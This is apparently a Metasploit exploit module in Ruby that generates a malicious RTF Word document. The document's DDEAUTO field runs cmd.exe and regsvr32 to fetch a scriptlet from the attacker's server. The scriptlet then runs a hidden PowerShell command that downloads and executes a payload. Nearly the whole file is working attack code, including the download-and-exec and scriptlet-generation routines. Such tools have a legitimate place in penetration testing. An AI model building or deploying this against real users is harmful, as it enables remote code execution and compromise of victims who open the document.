# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule  < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE

  def initialize(info  = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Microsoft Office DDE Payload Delivery&#039;,
      &#039;Description&#039; => %q{
        This module generates an DDE command to place within
        a word document, that when executed, will retrieve a HTA payload
        via HTTP from an web server.
      },
      &#039;Author&#039; => &#039;mumbai&#039;,
      &#039;License&#039; => MSF_LICENSE,
      &#039;DisclosureDate&#039; => &#039;Oct 9 2017&#039;,
      &#039;References&#039; => [
        [&#039;URL&#039;, &#039;https://gist.github.com/xillwillx/171c24c8e23512a891910824f506f563&#039;],
        [&#039;URL&#039;, &#039;https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/&#039;]
      ],
      &#039;Arch&#039; => [ARCH_X86, ARCH_X64],
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;Stance&#039; => Msf::Exploit::Stance::Aggressive,
      &#039;Targets&#039; =>
        [
          [&#039;Microsoft Office&#039;, {} ],
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;Payload&#039; => {
        &#039;DisableNops&#039; => true
      },
      &#039;DefaultOptions&#039; => {
        &#039;DisablePayloadHandler&#039; => false,
        &#039;EXITFUNC&#039; => &#039;thread&#039;
      }
    ))
    register_options([
      OptString.new("FILENAME", [true, "Filename to save as", "msf.rtf"]),
      OptPath.new("INJECT_PATH", [false, "Path to file to inject", nil])
    ])
  end

  def gen_psh(url, *method)
    ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl

    if method.include? &#039;string&#039;
      download_string = datastore[&#039;PSH-Proxy&#039;] ? (Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)) : (Rex::Powershell::PshMethods.download_and_exec_string(url))
    else
      # Random filename to use, if there isn&#039;t anything set
      random = "#{rand_text_alphanumeric 8}.exe"
      # Set filename (Use random filename if empty)
      filename = datastore[&#039;BinaryEXE-FILENAME&#039;].blank? ? random : datastore[&#039;BinaryEXE-FILENAME&#039;]

      # Set path (Use %TEMP% if empty)
      path = datastore[&#039;BinaryEXE-PATH&#039;].blank? ? "$env:temp" : %Q(&#039;#{datastore[&#039;BinaryEXE-PATH&#039;]}&#039;)

      # Join Path and Filename
      file = %Q(echo (#{path}+&#039;\\#{filename}&#039;))

      # Generate download PowerShell command
      download_string = Rex::Powershell::PshMethods.download_run(url, file)
    end

    download_and_run = "#{ignore_cert}#{download_string}"

    # Generate main PowerShell command
    return generate_psh_command_line(noprofile: true, windowstyle: &#039;hidden&#039;, command: download_and_run)
  end

  def on_request_uri(cli, _request)
    if _request.raw_uri =~ /\.sct$/
      print_status("Handling request for .sct from #{cli.peerhost}")
      payload = gen_psh("#{get_uri}", "string")
      data = gen_sct_file(payload)
      send_response(cli, data, &#039;Content-Type&#039; => &#039;text/plain&#039;)
    else
      print_status("Delivering payload to #{cli.peerhost}...")
      p = regenerate_payload(cli)
      data = cmd_psh_payload(p.encoded,
                       payload_instance.arch.first,
                       remove_comspec: true,
                       exec_in_place: true
      )
      send_response(cli, data, &#039;Content-Type&#039; => &#039;application/octet-stream&#039;)
    end
  end


  def rand_class_id
    "#{Rex::Text.rand_text_hex 8}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 12}"
  end


  def gen_sct_file(command)
    # If the provided command is empty, a correctly formatted response is still needed (otherwise the system raises an error).
    if command == &#039;&#039;
      return %{<?XML version="1.0"?><scriptlet><registration progid="#{Rex::Text.rand_text_alphanumeric 8}" classid="{#{rand_class_id}}"></registration></scriptlet>}
    # If a command is provided, tell the target system to execute it.
    else
      return %{<?XML version="1.0"?><scriptlet><registration progid="#{Rex::Text.rand_text_alphanumeric 8}" classid="{#{rand_class_id}}"><script><![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("#{command}",0);]]></script></registration></scriptlet>}
    end
  end

  def retrieve_header(filename)
    if (not datastore[&#039;INJECT_PATH&#039;].nil?)
      path = "#{datastore[&#039;INJECT_PATH&#039;]}"
    else
      path = nil
    end
    if (not path.nil?)
      if ::File.file?(path)
        ::File.open(path, &#039;rb&#039;) do |fd|
          header = fd.read(fd.stat.size).split(&#039;{\*\datastore&#039;).first
          header = header.to_s
          print_status("Injecting #{path}...")
          return header
        end
      else
        header = &#039;{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}&#039; + "\n"
        header << &#039;{\*\generator Riched20 6.3.9600}\viewkind4\uc1&#039; + "\n"
        header << &#039;\pard\sa200\sl276\slmult1\f0\fs22\lang9&#039; + "\n"
      end
    else
      header = &#039;{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}&#039; + "\n"
      header << &#039;{\*\generator Riched20 6.3.9600}\viewkind4\uc1&#039; + "\n"
      header << &#039;\pard\sa200\sl276\slmult1\f0\fs22\lang9&#039; + "\n"
    end
    return header
  end

  def create_rtf
    #
    header = retrieve_header(datastore[&#039;FILENAME&#039;])
    field_class = &#039;{\field{\*\fldinst {\rtlch\fcs1 \af31507 \ltrch\fcs0 \insrsid3807165  &#039;
    field_class << "DDEAUTO C:\\\\\\\\Programs\\\\\\\\Microsoft\\\\\\\\Office\\\\\\\\MSword.exe\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe \"/c regsvr32 /s /n /u /i:#{get_uri}.sct scrobj.dll\" }}"
    field_class << &#039;{\fldrslt }}\sectd \ltrsect\linex0\endnhere\sectlinegrid360\sectdefaultcl\sftnbj {\rtlch\fcs1 \af31507 \ltrch\fcs0&#039; + "\n"
    field_class << &#039;\insrsid5790315&#039; + "\n"
    field_class << &#039;\par }&#039;
    footer =  &#039;}}&#039; # footer
    rtf = header + field_class + footer
    rtf
  end

  def primer
    file_create(create_rtf)
  end
end

